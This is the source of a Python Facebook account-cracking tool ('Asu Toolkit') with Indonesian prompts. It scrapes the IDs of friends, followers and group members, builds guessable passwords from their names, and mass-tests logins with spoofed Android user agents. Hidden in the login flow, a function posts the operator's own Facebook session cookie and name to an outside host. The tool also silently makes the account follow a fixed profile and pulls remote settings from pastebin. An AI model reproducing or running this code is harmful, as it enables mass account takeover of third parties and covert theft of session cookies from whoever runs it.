import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] Installing requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] Installing rich\n")
    os.system("pip install rich")

import requests,bs4,json,os,sys,random,datetime,time,re,uuid
import urllib3,rich,base64
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.table import Table as me
from rich.tree import Tree
from rich.console import Console as sol
from time import time as todd
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import Progress, TextColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from rich import print as prints
from time import time as mek
from rich.tree import Tree

####colour##₦
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
color_panel = "#00C8FF"

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.kontol, self.iya, self.pasw = {}, [], []
        self.ak, self.ka, self.ya = [], [], []
        self.menu()

    def hapus(self):
        try:os.remove(".cok.txt");os.remove(".tok.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        WAR = random.choice(["[d_pink]","[b green]","[b cyan]","[b blue]","[b magenta]"])
        cetak(nel(f'''[b magenta]●[b yellow] ●[b green] ●{WAR}
▓█████▄ ▓█████  ███▄ ▄███▓ ▒█████   ███▄    █ 
▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██ ▀█   █ 
░██   █▌▒███   ▓██    ▓██░▒██░  ██▒▓██  ▀█ ██▒
░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ▒██   ██░▓██▒  ▐▌██▒
░▒████▓ ░▒████▒▒██▒   ░██▒░ ████▓▒░▒██░   ▓██░
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ▒  ▒  ░ ░  ░░  ░      ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░  ░    ░   ░      ░   ░ ░ ░ ▒     ░   ░ ░ 
   ░       ░  ░       ░       ░ ░           ░ 
 ░                                            

                       [b green][ Asu Toolkit ]''',
        title="Created By Yayan XD",
      subtitle="Recode By CyberDemon404"))

    def login_cokie(self):
        self.logoo()
        print("-----------------------------------------------------------")
        try:
            cok = input("[?] cookie : ")
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                print("[+] notice: anda sedang menggunakan mode free facebook")
                print("[-] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
                exit("\n[✓] proses mengubah ke mode data telah selesai.\n[-] silahkan masukan ulang cookie nya dengan mengetik python regex.py")
            elif 'href="/x/checkpoint/' in str(link):
                print("\n[!] Opshh cookie anda chekcpoint:(");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[!] cookie yang anda masukan invalid");time.sleep(2);self.login_cokie()
            else:
                print("\n[-] Mohon tunggu sebentar...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('.cok.txt', 'w').write(cok);open('.tok.txt', 'w').write(f"{nama}|{user}")
                print(f"[✓] selamat datang {nama} di ASU Toolkit");self.ikuti({"cookie": cok});self.datas(nama, cok)
                exit("\n[!] jalankan ulang perintah nya dengan ketik python regex.py")
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100053053007337", cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
        except:pass

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(✓) File save in proxies.txt, restart this tools\n")
        else:
            exit("(✓) File save in proxies.txt, restart this tools\n")

    def memek(self, mmk, kntl):
        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()

    def menu(self):
        try:
            cook = {"cookie": open(".cok.txt", "r").read()}
            nama, user = open(".tok.txt", "r").read().split("|")
        except FileNotFoundError:
            self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "mbasic_logout_button" not in link:
                self.hapus()
                print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
        self.jnckk()
        print(f"""

[+] your name   : {O}{nama}{N}
[+] id facebook : {O}{user}{N}""")
        print("""
  %s{%s01%s} search name
  %s{%s02%s} crack friends 
  %s{%s03%s} crack followers
  %s{%s04%s} crack member grup
  %s{%s05%s} check crack results
  %s{%s06%s} get proxy server list
  %s{%s00%s} logout tools ASU Toolkit
"""%(
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N,
N,H,N
))
        ykh = input(f"{H}[{M}+{H}]{N} @CyberDemon404_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            exit("belum selesai:)")
        elif ykh in ["2", "02"]:
            print("[+] ketik 'me' jika ingin crack dari teman anda.")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
            else:
                try:
                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                    if "Halaman Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    elif "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    elif "Konten Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(f"{self.url}/{user}/friends", cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
        elif ykh in ["3", "03"]:
            user = input(f"[{O}*{N}] enter id or username followers: ")
            if user in["", " "]:
                print(f"\n{M}jangan kosong");time.sleep(2);self.menu()
            elif user.isdigit():
                memek = (f"{self.url}/profile.php?id={user}&v=followers")
            else:
                memek = (f"{self.url}/{user}?v=followers")
            try:
                link = self.ses.get(memek, cookies=cook).text
                if "Halaman Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.follow(memek, cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["4", "04"]:
            user = input(f"[{O}*{N}] enter id gruop : ")
            try:
                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.dumps(f"{self.url}/groups/{user}", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["5", "05"]:
            self.cek_hasil()
        elif ykh in ["6", "06"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def cek_hasil(self):
        print("""-----------------------------------------------------
{01} check result ok
{02} check result cp
{00} back to menu
-----------------------------------------------------""")
        ykh = input(f"{H}[{M}+{H}]{N} @CyberDemon404_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try: yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["2", "02"]:
            try: yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["0", "00"]:
            self.menu()
        else:print("[!] input yang bnr");time.sleep(2);self.menu()

#-------------- DUMP ID -------------------
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass

    def jnckk(self):
        linz = self.ses.get("https://pastebin.com/raw/1PrCHvN7").json()
        for i in linz["friends"]["data"]:
            self.kontol.update(i)

    def follow(self, link, coki):
        try:
            xxxx = self.ses.get(link, cookies=coki).text
            rege = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', xxxx)
            for xxx in rege:
                if "profile.php?" in xxx[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", xxx[0])[0]+"<=>"+xxx[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", xxx[0])[0]+"<=>"+xxx[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Selengkapnya" in xxxx:
                self.follow(self.url+par(xxxx, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
        except:pass

    def dumps(self, link, coki):
        try:
            data = self.ses.get(link, cookies=coki).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
        except:pass

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            post = self.ses.post(self.cok, data=data).text
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
#--------------------------------------------
    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print("""    [ select metode ]

  %s{%s01%s} Api
  %s{%s02%s} Async
  %s{%s03%s} Api2
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @CyberDemon404_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
        elif ykh in ["2", "02"]:
            self.paswww("acy")
        elif ykh in ["3", "03"]:
            self.paswww("api2")
        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()

    def paswww(self, xx):
        print("""    [ select password ]

  %s{%s01%s} manual
  %s{%s02%s} gabung
  %s{%s03%s} otomatis
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} @CyberDemon404_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()

    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        while True:
            global prog,des
            pwek = input(f"[{O}?{N}] sandi : ")
            if pwek in[""," "]:
                print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
            elif len(pwek)<=5:
                print(f"[{M}×{N}] kata sandi minimal 6 karakter")
            else:
                if "api" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "acy" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.regguler, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "api2" in xx:
                    print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii2, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                else:
                    continue

    def carckk(self, kntd):
        self.apk()
        print("""-----------------------------------------------------
PROSES NGEHEK FB, MAINKAN MODE PESAWAT SETIAP 200 ID!
-----------------------------------------------------""")
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")
                    try:
                        if len(nama) <=5:
                            if len(depan) <=1 or len(depan) <=2:pass
                            else:
                                pwx = [nama, depan[0]+depan[1], depan[0]+"1", depan[0]+"12", depan[0]+"123", depan[0]+"@1", depan[0]+"@12", depan[0]+"@123", depan[0]+"321", depan[0]+"1234", depan[0]+"12345"]
                        else:
                            pwx = [nama, depan[0]+depan[1], depan[0]+"@1234", depan[0]+"4321", "12"+depan[0]+"12", "123"+depan[0]+"123", depan[0]+"123", depan[1]+"12", depan[1]+"123", depan[1]+"1234"]
                        if "iya" in self.iya:
                            for x in self.pasw:
                                pwx.append(x)
                        if "api" in kntd:
                            bool.submit(self.apiiiiii, uid, pwx)
                        elif "acy" in kntd:
                            bool.submit(self.regguler, uid, pwx)
                        elif "api2" in kntd:
                            bool.submit(self.apiiiiii2, uid, pwx)
                        else:bool.submit(self.regguler, uid, pwx)
                    except:pass
            exit("\n\ncracking done!")

    def apk(self):
        kntd = input("[?] apakah anda ingin menampilkan aplikasi yang terkait [Y/t]: ")
        if "y" in kntd:
            self.ya.append("ya")
        else:
            self.ya.append("ta")

    def dalvik(self):
        android_version = random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),'8.0.0','8.1','8.1.0','8','9','10','10.0','11','12','13','14'])
        device_model = random.choice([
		'Mi 9T Pro Build/QKQ1.190825.002; wv',
		'SM-A405FN Build/TQ2A.230305.008.C1',
		'moto g pure Build/S3RHS32.20-42-10-14-2-2',
		'ac Build/O11019',
		'TESLA MediaBox X900 Pro Build/PPR1.180610.011',
		'H6 Build/PPR1.181005.003',
		'M2101K7BI Build/TP1A.220624.014',
		'SM-A536B Build/SP1A.210812.016; BroadcastDotRadioApp',
		'SM-F707N Build/TP1A.220624.014',
		'moto g41 Build/S3RW32.138-29-5',
		'jacuzzi Build/R111-15329.63.0',
		'moto g82 5G Build/S1SUS32.73-112-22-4',
		'TX6 Build/PPR1.181005.003',
		'TD SYSTEMS Android TV Build/PTO2.220310.001',
		'DX170 Build/RQ3A.210705.001',
		'moto e6 play Build/POA29.550-36',
		'RCT6A06P22 Build/PPR1.180610.011',
		'NE2211 Build/SKQ1.220617.001',
		'AFTDCT31 Build/PMAIN1.2874N',
		'AFTEU011 Build/PS7624.3337N',
		'SO-51B Build/61.2.C.0.133',
		'Tech Pad X10 Build/RP1A.200720.011',
		'KFTRWI Build/PS7328.3432N',
		'Core-M5 Build/SKQ1.220303.001',
		'V2116 Build/TP1A.220624.014',
		'RMX3710 Build/SP1A.210812.016',
		'22111317PG Build/TKQ1.221114.001',
		'vivo X3V Build/KVT49L',
		'D5503 Build/14.5.A.0.242',
		'moto g73 5G Build/T1TNS33.14-32-4-1',
		'S53 Build/RKQ1.220411.001',
		'motorola edge 30 pro Build/T1SH33.35-23-20',
		'S75 Build/SP1A.210812.016',
		'HYUNDAI 2K Android TV Build/RTK1.220710.037',
		'moto g play (2021) Build/RZAS31.Q2-146-14-6-12',
		'Pixel 6a Build/TQ2A.230405.003.E1',
		'A53 Plus Build/LRX21M',
		'motorola one 5G ace Build/RZKS31.Q3-45-16-8-19',
		'I10_Pro Build/RP1A.201005.001',
		'Rino 9pro Build/QP1A.190711.020',
		'SM-A032F Build/SP1A.210812.016',
		'P20S_ROW Build/P20S_ROW',
		'moto g stylus (2022) Build/RRDES31.Q3-73-22-19',
		'motorola edge 20 Build/S1RGS32.53-18-22-27',
		'motorola edge 5G UW (2021) Build/S1RMS32.68-43-16-9',
		'QUANTUM_700 Build/KVT49L',
		'OPS Build/QD4A.200805.003',
		'P7PLUS Build/RP1A.201005.006',
		'SO-54C Build/64.1.C.0.102A',
		'Rombica TV Ultima Build/RTV-Ultima',
		'H9436 Build/52.0.A.3.27',
		'KIVI 2K Android TV Build/PTO6.220707.001',
		'Tanix H2 Build/PPR1.180610.011',
		'AIVI2 N FULL US Build/SQ3A.220705.003.A1',
		'SM-A528B Build/TP1A.220624.014',
		'K18 Build/K102',
		'itel A662L Build/SP1A.210812.016',
		'M2103K19PG Build/TP1A.220624.014',
		'Hisense Infinity H50S 5G Build/RP1A.200720.011',
		'Andromax G36C1H Build/LMY47V',
		'moto g32 Build/S2SN32.34-72-7',
		'32LE77SM Build/69c896a6_20180211_171447',
		'Pixel 6 Build/TQ2A.230405.003.E1',
		'ACE_I Build/QP1A.190711.020',
		'Pixel 7 Pro Build/TQ2A.230405.003.E1',
		'TDW7832 Build/QP1A.190711.020',
		'SM-A405S Build/RP1A.200720.012',
		'AKAITV Build/PPR1.180610.011',
		'M10_Pro Build/PPR1.180610.011',
		'Redmi 6 Build/O11019',
		'K50DLG12US Build/PTT1.190222.001',
		'NLS-MT90 Build/QKQ1.191224.003',
		'RMX3491 Build/RKQ1.211119.001',
		'moto g23 Build/THA33.31-24',
		'SM-M215G Build/TP1A.220624.014',
		'PEGT00 Build/RKQ1.211103.002',
		'Primo H8 Build/O11019',
		'SKY PAD10 Build/S00812',
		'LG-E610 Build/JZO54K',
		'MH-T6000 Build/MH-T6000V1.0.0B010',
		'V2031 Build/TP1A.220624.014',
		'Q96MINI Build/Q96MINI',
		'Redmi Note 7 Pro Build/QD1A.190821.014',
		'PCRT00 Build/N2G48H',
		'Pixel 4a (5G) Build/TQ2A.230405.003',
		'D21 Build/RP1A.201005.001',
		'kukui Build/R112-15359.45.0',
		'UpsideDownCake Build/UPB1.230309.014',
		'motorola one 5G ace Build/RZKS31.Q3-45-16-3-11',
		'KT109 Build/NRD90M',
		'P25_T_EEA Build/SQ1A.220105.002',
		'MTP30 Build/PPR1.180610.011',
		'Pixel 4a Build/TQ2A.230405.003',
		'Pixel 6 Pro Build/TQ2A.230405.003.E1',
		'i100 Build/NRD90M',
		'tough_phone Build/LMY47D',
		'X10 Build/SP1A.210812.016',
		'SM-T387V Build/M1AJQ',
		'N12 Build/PPR1.180610.011',
		'SO-52C Build/65.1.B.4.29',
		'AX960 Build/OPM2.171019.012',
		'Infinix X6516 Build/SP1A.210812.001',
		'S19 Max Build/TP1A.220624.014',
		'V4.SY.01.d4 Build/NHG47K',
		'FAST73G Build/OPM2.171019.012)',
		'coral Build/R111-15329.59.0',
		'Doro 8035 Build/S10A_602',
		'La_Tab_114 Build/QP1A.190711.020.C3',
		'908SH Build/S2008',
		'23021RAA2Y Build/TKQ1.221114.001',
		'SEI-S905X2 Build/QTT8.201201.004',
		'X96Q Build/D9 PRO 5G',
		'M2103K19G Build/TP1A.220624.014',
		'TechPad_9x Build/NHG47K',
		'CTR-AL00 Build/PQ3A.190605.003',
		'L10 Build/QP1A.190711.020',
		'moto g power (2021) Build/RZBS31.Q2-143-27-11-12',
		'octopus Build/R112-15359.45.0',
		'I4312 Build/54.0.A.3.70',
		'SDQ_52001G Build/O11019',
		'V2136A Build/PQ3A.190605.003',
		'decoder Build/RTT4.221216.001',
		'iCherry C255 Build/MRA58K; wv',
		'C256 Build/iCherry-C256-T03-20180208; wv'
		])
        d1=f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {device_model})"
        return d1
        


    def ua_api(self):
        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; TFX712G Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Condor;FBBD/Condor;FBDV/TFX712G;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
        uh = (f"Dalvik/2.10 (Linux; U; Android {str(random.randint(5,13))}; SM-N986U Build/RP1A.201005.001) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/498648027;FBCR/AXIS;FBMF/samsung;FBBD/samsung;FBDV/SM-N986U;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=3.0,width=2480,height=2480};]")
        au = (f"Dalvik/2.1.0 (Linux; U; Android {str(random.randint(9,13))}; CPH2185 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(random.randint(40,375))}.322.0.0.5.89;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/510733775;FBCR/AXIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2185;FBSV/{str(random.randint(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=3.0,width=2480,height=2480};]")
        bu = (f"Davik/2.1.0 (Linux; U; Android {str(random.randint(5,14))}; SM-T976B Build/NRD90M) [FBAN/MessengerLite;FBAV/{str(random.randint(40,278))}.306.0.0.3.149;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/589022987;FBCR/Axiata;FBMF/SAMSUNG;FBBD/SAMSUNG;FBDV/SM-T976B;FBSV/{str(random.randint(5,14))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=2048,width=2048};]")
        dz = (f"Davik/2.1.0 (Linux; U; Android {str(random.randint(4,12))}; RMX2010 Build/QKQ1.200209.002) [FBAN/MessengerLite;FBAV/{str(random.randint(45,457))}.322.0.0.3.87;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/648959049;FBCR/3;FBMF/realme;FBBD/realme;FBDV/RMX2010;FBSV/{str(random.randint(4,12))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]") 
        da = (f"Dalvik/2.1.0 (Linux; U; {str(random.randint(4,12))}; POCO X3 NFC MIUI/V{str(random.randint(9,12))}.0.10.0.QJGMIXM) [FBAN/FB4A;FBAV/39.0.0.0.73;FBPN/com.facebook.katana;FBLC/in_ID;FBBV/12686058;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBDV/POCO X3 NFC;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/density=2.75,width=1080,height=2179;FB_FW/1;]")
      #  return random.choice([ua,uh,au,bu,dz,da])
        return ua

    def cek_apk(self, user, pw, coki):
        try:
            link = self.ses.get(self.url+"/", cookies={"cookie": coki}).text
            if 'href="/zero/optin/write/' in str(link):
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": coki}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": coki}).text
        except:pass
        aktif = Tree("")
        self.ApkAktif(f"{self.url}/settings/apps/tabbed/?tab=active", coki)
        if len(self.ak)==0:
            aktif.add("[bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
        else:
            for apk in self.ak:
                aktif.add(apk)
        kadal = Tree("")
        self.ApkKadal(f"{self.url}/settings/apps/tabbed/?tab=inactive", coki)
        if len(self.ka)==0:
            kadal.add("[bold red]Tidak ada apklikasi aktif yang terkait di akun ini")
        else:
            for apk in self.ka:
                kadal.add(apk)
        tree = Tree("")
        tree.add(f"[[bold green]LIVE[/]] {user}|{pw}")
        tree.add(f"[[bold green]LIVE[/]] [bold green]{coki}[/]")
        tree.add("Aplikasi Terkait").add(f"Aktif [bold green]{str(len(self.ak))}[/]").add(aktif)
        tree.add("").add(f"Kedaluwarsa [bold red]{str(len(self.ka))}[/]").add(kadal)
